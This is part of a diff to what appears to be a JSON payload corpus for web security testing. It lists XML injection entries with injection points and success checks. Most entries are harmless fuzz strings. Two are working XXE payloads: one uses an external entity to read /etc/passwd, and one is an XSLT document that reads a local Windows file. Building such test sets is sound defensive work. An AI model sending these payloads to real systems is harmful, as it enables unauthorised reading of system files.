+    "payload_id": "OWP-31402",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM \"file:///etc/passwd\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31403",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "@",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31404",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "$",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31405",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": ":",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31406",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31407",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "0.9",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31408",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "1.7976931348623157e+308",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31409",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "5e-324",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31410",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "0.00005",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31411",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "5e-10",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31412",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&apos;XoiZR",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31413",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&quot;XoiZR",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31414",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&lt;Tnn96&gt;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31415",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&lt;?Tnn96 ?&gt;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31416",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&lt;? Tnn96 ?&gt;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31417",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&lt;% Tnn96 %&gt;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31418",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&lt;%= Tnn96 %&gt;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31419",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "[Tnn96]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31420",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "(Tnn96)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31421",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "{Tnn96}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31422",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "{{Tnn96}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31423",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "{= Tnn96}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31424",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "{{= Tnn96}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-51228",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]>\r\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\r\n  <xsl:template match=\"/fruits\">\r\n    Fruits &ext_file;:\r\n    <!-- Loop for each fruit -->\r\n    <xsl:for-each select=\"fruit\">\r\n      <!-- Print name: description -->\r\n      - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>\r\n    </xsl:for-each>\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
